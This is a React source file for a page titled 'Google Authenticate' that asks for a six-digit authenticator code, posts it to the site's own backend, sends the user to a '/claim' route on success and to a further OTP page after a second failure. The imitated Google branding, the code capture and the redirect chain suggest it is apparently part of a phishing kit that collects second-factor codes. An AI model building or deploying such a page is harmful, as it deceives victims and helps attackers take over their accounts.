import React, { useState, useRef } from "react";
import { IoArrowBack } from "react-icons/io5";
import axios from "axios";
import BASE_URL from "../components/urls";
import { useNavigate } from "react-router-dom";

const Auth = () => {
  const [code, setCode] = useState(Array(6).fill(""));
  const inputsRef = useRef([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [failedOnce, setFailedOnce] = useState(false);
  const navigate = useNavigate();

  // ✅ Handle input changes
  const handleChange = (value, index) => {
    if (/^[0-9]$/.test(value) || value === "") {
      const newCode = [...code];
      newCode[index] = value;
      setCode(newCode);

      if (value && index < 5) {
        inputsRef.current[index + 1].focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputsRef.current[index - 1].focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData
      .getData("Text")
      .replace(/\D/g, "")
      .slice(0, 6);
    if (pastedData.length) {
      const newCode = [...code];
      for (let i = 0; i < 6; i++) {
        newCode[i] = pastedData[i] || "";
      }
      setCode(newCode);
      if (inputsRef.current[5]) inputsRef.current[5].focus();
    }
  };

  const handlePasteButton = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const digits = text.replace(/\D/g, "").slice(0, 6);
      if (digits) {
        const newCode = [...code];
        for (let i = 0; i < 6; i++) {
          newCode[i] = digits[i] || "";
        }
        setCode(newCode);
        if (inputsRef.current[5]) inputsRef.current[5].focus();
      }
    } catch (error) {
      console.error("Failed to read clipboard:", error);
    }
  };

  const handleSubmit = () => {
    const authCode = code.join("");
    console.log("Auth Code:", authCode);

    if (authCode.length !== 6) {
      setError("Please enter all 6 digits");
      return;
    }

    setLoading(true);
    setError("");

    axios
      .post(`${BASE_URL}/auth`, { auth: authCode })
      .then(() => {
        // ✅ If successful, go to claim
        navigate("/claim");
      })
      .catch(() => {
        if (!failedOnce) {
          setError("Incorrect authentication code. Try again.");
          setFailedOnce(true);
          handleRefresh(); // Clear inputs
        } else {
          navigate("/otp"); // ✅ On second failure, go to OTP page
        }
      })
      .finally(() => setLoading(false));
  };

  const handleRefresh = () => {
    setCode(Array(6).fill(""));
    inputsRef.current[0].focus();
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col px-6">
      {/* Back Button */}
      <button className="mt-6 mb-10 text-gray-300 hover:text-white flex items-center gap-2">
        <IoArrowBack size={22} /> Back
      </button>

      {/* Header */}
      <div className="text-left mb-6">
        <h1 className="text-2xl font-bold mb-1">Google Authenticate</h1>
        <p className="text-gray-400 text-sm">
          Enter the 6-digit authentication code from Google Authenticator
        </p>
      </div>

      {/* Error Message */}
      {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

      {/* OTP Inputs */}
      <div className="flex justify-between mb-6">
        {code.map((digit, index) => (
          <input
            key={index}
            type="text"
            maxLength="1"
            value={digit}
            ref={(el) => (inputsRef.current[index] = el)}
            onChange={(e) => handleChange(e.target.value, index)}
            onKeyDown={(e) => handleKeyDown(e, index)}
            onPaste={handlePaste}
            className="w-12 h-14 text-center text-2xl rounded-lg bg-[#1c1c1e] border border-gray-700 focus:border-gray-500 focus:outline-none"
          />
        ))}
      </div>

      {/* Paste Button */}
      <div className="text-right mb-8">
        <button
          onClick={handlePasteButton}
          className="text-gray-400 hover:text-white text-sm border border-gray-700 rounded-full px-4 py-1"
        >
          Paste
        </button>
      </div>

      {/* Submit Button */}
      <button
        onClick={handleSubmit}
        disabled={code.includes("")}
        className={`w-full py-4 rounded-xl font-semibold text-lg ${
          code.includes("")
            ? "bg-gray-800 text-gray-500 cursor-not-allowed"
            : "bg-[#1c1c1e] hover:bg-[#2f2f31]"
        }`}
      >
        {loading ? "Submitting..." : "Submit"}
      </button>

      {/* Help Text */}
      <p className="text-sm text-blue-500 mt-6 text-center cursor-pointer">
        Are security features unavailable?
      </p>
    </div>
  );
};

export default Auth;
